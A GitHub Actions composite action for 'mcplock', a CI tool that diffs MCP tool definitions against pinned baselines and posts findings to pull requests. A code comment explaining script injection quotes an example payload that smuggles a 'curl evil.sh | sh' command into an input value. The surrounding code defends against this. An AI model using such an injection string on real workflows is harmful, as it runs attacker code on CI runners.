name: 'mcplock check'
description: 'Pin, diff, and verify MCP tool definitions against baseline snapshots in CI'
branding:
  icon: 'lock'
  color: 'blue'

inputs:
  server:
    description: 'Server command (e.g. "npx -y @modelcontextprotocol/server-filesystem ./data") or URL'
    required: true
  transport:
    description: 'stdio | http | auto (infer from server argument)'
    required: false
    default: 'auto'
  fail-on:
    description: 'Lowest severity threshold to fail the build (critical | high | medium | informational)'
    required: false
    default: 'high'
  json-report:
    description: 'Optional file path to write machine-readable JSON report'
    required: false
    default: ''
  env:
    description: >-
      Space-separated KEY=VALUE pairs passed to a stdio server. Prefer passing
      secrets via the workflow's own env and referencing them here, rather than
      inlining literals.
    required: false
    default: ''
  mcplock-version:
    description: >-
      pip specifier for mcplock. Defaults to the PyPI name, which requires the
      Phase 6 release; until then pass a git URL, e.g.
      "git+https://github.com/yash161004/mcplock@master".
    required: false
    default: 'mcplock'
  python-version:
    description: 'Python version for setup-python'
    required: false
    default: '3.11'
  comment-on-pr:
    description: 'Post a PR comment summarizing findings (true | false | auto)'
    required: false
    default: 'auto'
  github-token:
    description: 'GitHub token for posting PR comments'
    required: false
    default: '${{ github.token }}'

runs:
  using: 'composite'
  steps:
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: ${{ inputs.python-version }}

    # Every caller-controlled value is passed through `env:` and referenced as a
    # shell variable. Interpolating `${{ inputs.* }}` directly into `run:` splices
    # the raw text into the script before bash sees it, so a value such as
    #   foo"; curl evil.sh | sh; #
    # executes on the runner. This is the standard GitHub Actions script-injection
    # class; quoting the expansion is not sufficient, because the substitution
    # happens before quoting is evaluated.
    - name: Install mcplock
      shell: bash
      env:
        MCPLOCK_VERSION: ${{ inputs.mcplock-version }}
      run: |
        python -m pip install --upgrade pip
        python -m pip install -- "$MCPLOCK_VERSION"

    - name: Run mcplock check
      shell: bash
      env:
        MCPLOCK_SERVER: ${{ inputs.server }}
        MCPLOCK_TRANSPORT: ${{ inputs.transport }}
        MCPLOCK_FAIL_ON: ${{ inputs.fail-on }}
        MCPLOCK_JSON_REPORT: ${{ inputs.json-report }}
        MCPLOCK_ENV: ${{ inputs.env }}
      run: |
        set -euo pipefail

        CMD_ARGS=()
        if [ -n "$MCPLOCK_TRANSPORT" ] && [ "$MCPLOCK_TRANSPORT" != "auto" ]; then
          CMD_ARGS+=("--transport" "$MCPLOCK_TRANSPORT")
        fi
        if [ -n "$MCPLOCK_FAIL_ON" ]; then
          CMD_ARGS+=("--fail-on" "$MCPLOCK_FAIL_ON")
        fi

        REPORT_PATH="${MCPLOCK_JSON_REPORT:-mcplock-report.json}"
        CMD_ARGS+=("--json" "$REPORT_PATH")

        if [ -n "$MCPLOCK_ENV" ]; then
          # read -ra splits on whitespace without globbing or re-evaluating the
          # value, which a bare `for pair in $MCPLOCK_ENV` would do.
          read -ra ENV_PAIRS <<< "$MCPLOCK_ENV"
          for pair in "${ENV_PAIRS[@]}"; do
            CMD_ARGS+=("--env" "$pair")
          done
        fi

        mcplock check "$MCPLOCK_SERVER" "${CMD_ARGS[@]}"

    - name: Post PR comment
      if: always()
      shell: bash
      env:
        GITHUB_TOKEN: ${{ inputs.github-token }}
        COMMENT_ON_PR: ${{ inputs.comment-on-pr }}
        MCPLOCK_JSON_REPORT: ${{ inputs.json-report }}
        EVENT_PATH: ${{ github.event_path }}
        REPOSITORY: ${{ github.repository }}
        SERVER_ID: ${{ inputs.server }}
      run: |
        python -c '
        import json
        import os
        import urllib.request
        import urllib.error

        token = os.environ.get("GITHUB_TOKEN", "")
        comment_mode = os.environ.get("COMMENT_ON_PR", "auto").lower()
        if comment_mode == "false" or not token:
            print("PR commenting disabled or token missing; skipping.")
            exit(0)

        pr_number = None
        event_path = os.environ.get("EVENT_PATH", "")
        if event_path and os.path.exists(event_path):
            try:
                with open(event_path, "r", encoding="utf-8") as f:
                    event = json.load(f)
                pr_number = event.get("pull_request", {}).get("number")
                if not pr_number and "issue" in event and "pull_request" in event["issue"]:
                    pr_number = event["issue"]["number"]
            except Exception as e:
                print(f"Error reading event payload: {e}")

        if not pr_number:
            if comment_mode == "true":
                print("No PR number found in GitHub event context.")
            else:
                print("Not a pull request event; skipping PR comment.")
            exit(0)

        repo = os.environ.get("REPOSITORY", "")
        if not repo:
            print("No repository context found; skipping PR comment.")
            exit(0)

        report_path = os.environ.get("MCPLOCK_JSON_REPORT") or "mcplock-report.json"
        findings = []
        counts = {}
        server_id = os.environ.get("SERVER_ID", "")
        if os.path.exists(report_path):
            try:
                with open(report_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                findings = data.get("findings", [])
                counts = data.get("counts", {})
                server_id = data.get("server_id", server_id)
            except Exception as e:
                print(f"Error loading report from {report_path}: {e}")

        lines = ["### 🔒 mcplock check report", ""]
        lines.append(f"**Server:** `{server_id}`")
        lines.append("")

        if not findings:
            lines.append("✅ **No drift detected** against the pinned baseline.")
        else:
            summary_str = "  ".join(f"{k}: {v}" for k, v in counts.items() if v)
            lines.append(f"⚠️ **{len(findings)} finding(s) detected** ({summary_str}):")
            lines.append("")
            lines.append("| Severity | Tool | Change | Reasons / Details |")
            lines.append("| --- | --- | --- | --- |")
            for f in findings:
                sev = str(f.get("severity", "unknown")).upper()
                tool = str(f.get("tool_name", ""))
                ch = str(f.get("change_type", ""))
                reasons = "<br>".join(str(r) for r in f.get("reasons", []))
                lines.append(f"| **{sev}** | `{tool}` | {ch} | {reasons} |")

        body = "\n".join(lines)

        url = f"https://api.github.com/repos/{repo}/issues/{pr_number}/comments"
        req = urllib.request.Request(
            url,
            data=json.dumps({"body": body}).encode("utf-8"),
            headers={
                "Authorization": f"Bearer {token}",
                "Accept": "application/vnd.github+json",
                "X-GitHub-Api-Version": "2022-11-28",
                "Content-Type": "application/json",
            },
            method="POST",
        )

        try:
            with urllib.request.urlopen(req) as resp:
                print(f"Posted PR comment successfully (HTTP {resp.status}).")
        except urllib.error.HTTPError as err:
            print(f"Failed to post PR comment: HTTP {err.code} {err.reason}")
        except Exception as err:
            print(f"Failed to post PR comment: {err}")
        '
